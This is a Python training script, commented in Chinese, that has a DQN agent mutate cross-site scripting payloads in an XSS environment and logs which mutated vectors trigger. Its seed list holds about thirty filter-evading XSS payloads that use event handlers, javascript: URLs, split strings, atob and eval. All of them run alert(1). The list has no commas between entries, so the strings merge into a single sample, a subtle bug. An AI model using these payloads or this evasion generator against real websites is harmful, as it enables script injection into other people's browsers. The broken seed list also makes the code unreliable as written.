import numpy as np

from DQNAgent import DQNAgent
from XSSEnv import XSSEnv
from ActionTable import ACTIONS

# 準備初始攻擊向量樣本
initial_samples = [
    "<svg onload=\"setTimeout('a\\u006cert(1)',0)\">"
    "<iframe srcdoc=\"<img src='x' onerror='setTimeout(&#39;al&#39;+&#39;ert(1)&#39;,0)'>\">"
    "<math href=\"javascript:setTimeout('ale'+'rt(1)',5)\"><mspace /></math>"
    "<body onunload=setTimeout('al'+'ert(1)',0)>"
    "<form><input type=image src onerror=setTimeout('al'+'ert(1)',0)></form>"
    "<video><source onerror=\"setTimeout('al'+'ert(1)',0)\"></video>"
    "<embed src=javascript:setTimeout('ale'+'rt(1)',1)></embed>"
    "<details open ontoggle=\"setTimeout('ale'+'rt(1)',0)\"></details>"
    "<marquee onstart=setTimeout('ale'+'rt(1)',0)></marquee>"
    "<x onpointerenter=setTimeout('ale'+'rt(1)',0)></x>"
    "<svg onload=\"setTimeout('alert(1)',1)\">"
    "<img src=\"x\" onerror=\"setTimeout('alert(1)',1)\">"
    "<iframe onload=\"setTimeout(() => { alert(1); }, 1)\">"
    "<math href=\"javascript:setTimeout(`alert\\u00281\\u0029`,1)\"/>"
    "<video><source onerror=\"setTimeout(function(){alert(1)},1)\">"
    "<details open ontoggle=\"setTimeout('alert(1)',1)\">"
    "<body onload=\"setTimeout('alert`1`',1)\">"
    "<bgsound onload=\"setTimeout(() => alert(1), 1)\">"
    "<marquee onstart=\"setTimeout(()=>{alert(1)},1)\">"
    "<keygen autofocus onfocus=\"setTimeout('alert(1)',1)\"><marquee onstart=setTimeout('ale'+'rt(1)',100)></marquee>"
    "<img src=x onerror=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),100)>"
    "<input type=text autofocus onfocus=setTimeout([...`${'alert(1)'}`].join(``),100)>"
    "<body onpageshow=setTimeout(Function('al'+'ert(1)'),100)>"
    "<base href=\"javascript:setTimeout('console.log(alert(1))', 100);\">"
    "<video src=x onerror=setTimeout(na+'vigator.al'+'ert(1)',100)>"
    "<keygen autofocus onfocus=setTimeout(atob('YWxlcnQoMSk='),100)>"
    "<form autofocus onfocus=setTimeout``(new Function(\"a\"+\"lert(1)\"),100)>"
    "<embed src=x onerror=setTimeout(eval,100)('a'+'lert(1)')>"
]
env = XSSEnv(initial_samples, max_steps=5)

# 建立智能體
state_dim = 1 + 256  # Byte Histogram 維度
action_dim = len(ACTIONS)
agent = DQNAgent(state_dim, action_dim, lr=1e-3, gamma=0.95, 
                 epsilon_start=1.0, epsilon_end=0.1, epsilon_decay=0.995, 
                 target_update_freq=500, memory_capacity=5000)

# 訓練設定
num_episodes = 50
batch_size = 64

success_count = 0
for episode in range(1, num_episodes+1):
    state = env.reset()  # 初始化狀態
    total_reward = 0.0
    done = False
    step = 0
    action_sequence = []  # 紀錄本回合動作序列
    while not done:
        # 從Agent取得動作
        action = agent.select_action(state)
        action_sequence.append(action)
        # 與環境交互
        next_state, reward, done, info = env.step(action)
        total_reward += reward
        # 將經驗存入回放
        agent.store_transition(state, action, reward, next_state if next_state is not None else np.zeros_like(state), done)
        # DQN訓練一步
        loss = agent.train_step(batch_size)
        # 狀態更新
        state = next_state if next_state is not None else state
        step += 1
        # 如果成功觸發，更新成功計數
        if done and info.get('triggered'):
            success_count += 1
    # 每回合結束，輸出日誌
    success_flag = "成功" if info.get('triggered') else "失敗"
    print(f"Episode {episode:03d}: {success_flag}, 步數={step}, 總reward={total_reward:.2f}, 動作序列={action_sequence}")
    if info.get('triggered'):
        print(f"  >> 成功攻擊向量: {env.current_payload}")
    # 可選：每隔若干集輸出當前成功率等統計
    if episode % 10 == 0:
        success_rate = success_count / episode
        print(f"[統計] 已進行{episode}回合，成功觸發 {success_count} 次，成功率={success_rate*100:.1f}%")
